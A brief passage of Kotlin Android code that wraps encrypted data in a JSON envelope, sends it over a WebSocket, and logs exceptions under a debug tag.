                val envelope = JSONObject().apply {
                    put("p", encryptedData)
                }

                val sent = webSocket?.send(envelope.toString()) ?: false
            }

        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
